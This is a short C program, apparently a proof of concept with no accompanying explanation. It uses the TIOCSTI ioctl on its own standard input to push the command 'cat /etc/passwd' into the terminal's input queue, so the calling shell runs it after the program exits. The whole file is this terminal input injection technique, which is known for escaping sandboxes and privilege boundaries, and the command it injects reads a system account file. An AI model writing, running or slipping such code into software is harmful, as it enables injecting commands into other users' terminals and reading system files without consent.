#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

int main() {
    char terminal_device[256];
    snprintf(terminal_device, sizeof(terminal_device), "/proc/%d/fd/0", getpid());

    int fd = open(terminal_device, O_RDWR);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    const char cmd[] = "cat /etc/passwd\n";
    for (size_t i = 0; i < strlen(cmd); i++) {
        if (ioctl(fd, TIOCSTI, &cmd[i]) < 0) {
            perror("ioctl");
            close(fd);
            return 1;
        }
    }

    close(fd);
    return 0;
}
